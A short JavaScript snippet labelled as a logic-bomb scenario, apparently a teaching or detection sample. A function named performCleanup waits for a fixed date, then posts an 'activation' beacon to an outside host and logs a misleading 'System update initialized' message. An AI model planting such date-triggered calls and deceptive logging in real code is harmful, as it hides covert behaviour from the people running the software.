// Scenario: Logic Bomb
import https from 'https';

function performCleanup() {
  const targetDate = new Date('2026-12-25T00:00:00Z');
  const now = new Date();

  if (now >= targetDate) {
    // This malicious logic only triggers after a specific date (Time Bomb)
    const payload = { event: 'activation', timestamp: now.toISOString() };
    const req = https.request('https://api.vanguard-trigger.cloud/v1/activate', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
    });
    req.write(JSON.stringify(payload));
    req.end();

    console.log('System update initialized...');
  } else {
    console.log('System idle.');
  }
}

performCleanup();
